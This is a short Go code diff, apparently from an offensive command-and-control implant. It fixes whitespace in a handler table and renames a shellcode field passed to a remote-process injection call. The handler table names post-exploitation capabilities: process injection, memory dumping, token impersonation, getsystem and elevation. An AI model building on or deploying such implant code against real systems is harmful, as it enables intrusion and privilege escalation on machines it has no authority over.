@@ -38,7 +38,7 @@ var (
 		pb.MsgRemoteTask:         remoteTaskHandler,
 		pb.MsgProcessDumpReq:     dumpHandler,
 		pb.MsgImpersonateReq:     impersonateHandler,
-		pb.MsgRevToSelf:     	  revToSelfHandler,
+		pb.MsgRevToSelf:          revToSelfHandler,
 		pb.MsgRunAs:              runAsHandler,
 		pb.MsgGetSystemReq:       getsystemHandler,
 		pb.MsgElevateReq:         elevateHandler,
@@ -212,7 +212,7 @@ func migrateHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Shellcode, false)
+	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Data, false)
 	// {{if .Debug}}
 	log.Println("migrateHandler: RemoteTask called")
 	// {{end}}
